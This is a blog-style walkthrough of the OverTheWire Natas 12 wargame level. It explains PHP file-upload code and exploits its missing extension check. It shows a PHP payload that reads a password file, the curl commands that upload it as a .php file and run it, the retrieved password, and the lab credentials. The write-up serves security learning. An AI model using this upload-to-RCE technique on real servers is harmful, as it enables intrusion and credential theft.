---
date: '2026-07-10'
description: please dear god no more php
draft: false
title: natas-12
weight: 13
ShowToc: false
---

| info | value                                       |
|:-----|--------------------------------------------:|
| user | `natas12`                                   |
| pass | `EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng`          |
| host | `http://natas12.natas.labs.overthewire.org` |


## explanation

the source of this is way more comprehensive than the [previous task](http://dat.vah.wtf/posts/overthewire/natas/shell/natas-11/), but still quite tricky

as per usual, walk through it & rewrite it to be more comprehensive. function names give it away anyway:


**`genRandomString()`**:

```php
function genRandomString() {
  $length = 10;
  $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
  $string = "";

  # for 10 iterations: append a random char from $characters to $string
  for ($p = 0; $p < $length; $p++) {
    $string .= $characters[mt_rand(0, strlen($characters)-1)];
    # brute forcing this is not part of the task tho! it's good to know what
    # the prng generates as output anyways:
    # `mt_rand` is not cryptographically secure, making the *m*ersenne *t*wister
    # algorithm with a finite internal state of 624 numbers predictable.
    # tl;dr: its state can be recovered from enough outputs
  }

  return $string;
}
```

**`makeRandomPath()`** & **`makeRandomPathFromFilename`**:

```php
function makeRandomPath($dir, $ext) {
  do {
    $path = $dir . "/" . genRandomString() . "." . $ext;
    # what a fucking mess
  } while(file_exists($path));
  # ensuring `$path` isn't taken, it will create a random path

  return $path;
}

# take in a directory & a filename
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    # `pathinfo()` parses a file path & returns information about its
    # components, e.g. dir-, base-; filename & extension

    return makeRandomPath($dir, $ext);
    # in this case, the filename's extension is passed to `makeRandomPath()`
}
```

here is an example output of all 3 components combined with `upload` passed as `$dir` name:


| `genRandomString()` | `makeRandomPath()` | `makeRandomPathFromFilename("upload", "jpg")` |
|:-:|:-:|:-:|
| 5ejfpi6lw9 | upload/4bgqd9i7ar.jpg | upload/mi732s0d1a. |

> each column was called separately, also note that the third column will be important for later as `jpg` varies from `.jpg`

the rest looks like mumbo jumbo:

```php
if (array_key_exists("filename", $_POST)) {
# `array_key_exists` only checks that a `filename` key was sent

  $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
  # this value could look like `upload/fsm99awzg3.`

  if (filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
    echo "too big";
  } else {
    if (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
    # a boolean that "ensures that the file designated by from is a valid upload
    # file. If the file is valid, it will be moved to the filename given by to."
    # in this case *from* & *to* are the arguments passed into the function:
    # `function move_uploaded_file(string $from, string $to): bool`
    # additionally, the function moves the temp file to the path you give it
    # which has no checks on the name or type you supply

      echo "uploaded: <a href='$target_path'>$target_path</a>";
    } else {
      echo "error";
    }
  }
} else {
# if the key does not exist, the else block jumps into the default state of
# uploading a file, or visiting the site for the first time:
```

```html
<form enctype="multipart/form-data" action="index.php" method="POST">
  <input
    type="hidden"
    name="MAX_FILE_SIZE"
    value="1000"
  />
  <input
    type="hidden"
    name="filename"
    value="<?php print genRandomString(); ?>.jpg"
  />

  Choose a JPEG to upload (max 1KB)
  <input
    name="uploadedfile"
    type="file"
  />
  <input
    type="submit"
    value="Upload File"
  />
</form>
```

now to see this full thing in action, an example request with a tiny 14x15, ≤ 1000 byte file could look like this

```sh
 stat tiny.jpg
# Size: 138             Blocks: 8          IO Block: 4096   regular file

curl http://natas12.natas.labs.overthewire.org \
-u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng \
-F "uploadedfile=@$HOME/tiny.jpg" \
-F "filename="

# The file upload/2uwyyhjgqf. has been uploaded
```

> note that the `filename` field is required

now if you were to look at what the server saved, you can pull the file from the server as well (important in a second!)

```sh
curl http://natas12.natas.labs.overthewire.org/upload/2uwyyhjgqf. \
-u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng \
--output uploadedFile.jpg
```

where it gets interesting is that none of the above source code includes any filtering mechanism, (see [extension validation](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html#extension-validation)) - so in all honesty: create a basic php script to read natas13 password, send it with another extension in the `filename` field & retrieve what ran:

**payload.jpg**:

```php
<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>
```

> because it's in `.jpg` format & ≤ 1000 bytes, it fulfills all conditions to be uploaded to the remote server, granting [rce](https://www.cloudflare.com/learning/security/what-is-remote-code-execution/)

send the data with new filename extension:

```sh
curl http://natas12.natas.labs.overthewire.org \
-u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng \
-F "uploadedfile=@$HOME/payload.jpg" \
-F "filename=.php" # <- important
# The file upload/lzhvzkcde4.php has been uploaded
```

lastly, open the new file that was interpreted by the webserver

```sh
curl http://natas12.natas.labs.overthewire.org/upload/lzhvzkcde4.php \
-u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng
# g8ba0olAzaSJuyS4gnmbdVVigAICLG1k
```

---

## but why does this work?

> note that i am no expert in this field - if there are any misconceptions, errors, misleading information, etc., feel free to [create an issue](https://github.com/vahrina/dat/issues)

tl;dr: the whole chain depends on the server saving an uploaded file whose extension we control

![ ](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExMnIwcDU5NGtpa3lhMTk0NXFzZjVmazZwOWpiOTdkd3J1cHJ6ZHhqaiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/IeKgCDlpTqRQbZEhBF/giphy.gif#center)

nothing validates the format or contents - the only server side check is the size: as long as it's ≤ 1000 bytes, it's good to go

```php
if (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
```

the uploaded file (`uploadedfile` lol) gets moved to `$target_path`, & that path is built earlier by `makeRandomPathFromFilename($dir, $filename)`. as the table earlier showed, if the filename has no extension, the result ends in an empty string, so the path ends in a literal dot: `pathinfo("jpeg", PATHINFO_EXTENSION)`. however `pathinfo(".jpeg", PATHINFO_EXTENSION)` returns jpeg

so the `filename` value controls the extension of the saved file, & sending `.php` puts a `.php` file on the server
